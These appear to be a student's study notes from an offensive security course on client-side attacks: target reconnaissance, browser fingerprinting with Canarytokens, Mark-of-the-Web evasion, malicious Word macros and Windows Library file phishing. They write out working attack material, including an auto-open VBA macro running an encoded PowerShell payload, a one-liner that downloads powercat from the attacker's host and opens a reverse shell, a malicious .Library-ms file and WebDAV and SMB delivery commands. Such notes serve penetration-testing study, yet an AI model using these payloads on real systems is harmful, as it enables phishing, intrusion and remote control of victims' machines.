Client side attacks

traditional attack model: 
enumerate the accessible machines and attempt to exploit exposed services

Target Reconnaissance

inspection of metadata tags of publically avaliable documents associated with the target organization

author, creation date, name and version of softwware os 

gobuster with -x for file extensions on target's web site

display metadata of files
exiftool
-a to display duplicated tags
-u to display unknown tags 


Client Fingerprinting

obtain os and browser info from a target in a non routable internal net

canarytokens: a free web service that generates a link with an embedded token 

when target opens link in browser, we get info about their browser, IP, and OS

web page allows up to select the kind of token we want to create, must enter email to get alerts of the token or provide a webhook url

Manage this token for settings of the token

History shows all visitors that clicked the token link and the info of the system

upper half of the detailed view shows info of location and attempts to determine org name

user agent sent by browser is also displayed, but it can be modded so not really reliable

we can also embed Canarytoken in Word documents or PDF, image can be viewed when opened


Exploiting Ms office

Preparing attack

email providers and spam filter filter out all MS doc by default, must use pretext

MOTW is not added to files on FAT32 formatted devices

it is possible to avoid getting a file flagged with MOTW by providing it in container files like 7zip, ISO and IMG


Leveraging Microsoft Word Macros

client side vectors: dynamic data exchange and object linking and embedding no longer works

create a blank work doc with .doc, no docx. .docm also works

choose current document from the drop down menu in the Macro dialog window

View tab from the menu to create Macro

we leverage ActiveX Objects which provide access to underlying operating system commands. we use WScript through the Windows Script Host Shell object

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub


IEX(New-Object System.Net.WebClient).DownloadString('http://<myip>/powercat.ps1');powercat -c <myip> -p 4444 -e powershell
this grabs powercat and exr pwoershell from my machine


str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
this python command's output need to be shoved between dim and create object


Obtaining Code Execution via Windows Libary Files

containers for user content, conenct users with data stored in remote locations like web services

.Library-ms

2 stagees

1: create windows library file connecting to a WebDAV share we own

victim recevives .Library-ms via social engineering, we provide a payload in the form of a .lnk shortcut file for second stage exe 

wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav

we must use visual studio code to create the Libary file

save the file as config.Library-ms

Lirary files are written in xml and in 3 parts

Library properties, General library information and Library location

<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>http://192.168.45.164</url>
            </simpleLocation>
            </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>

2. powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.164:8000/powercat.ps1');
powercat -c 192.168.45.164 -p 4444 -e powershell"

this is the command we'll use in the create a short cut expliot as a payload

we'll create a short cut on the desktop and paste the above ps commadn

smbclient //192.168.50.195/share -c 'put config.Library-ms' 
if diliverying via smb instead of normal email

.lnk file will be tagged with the Mark of the Web when exe in explorer

remember to check -x pdf, txt in gobuster even if 80 is 404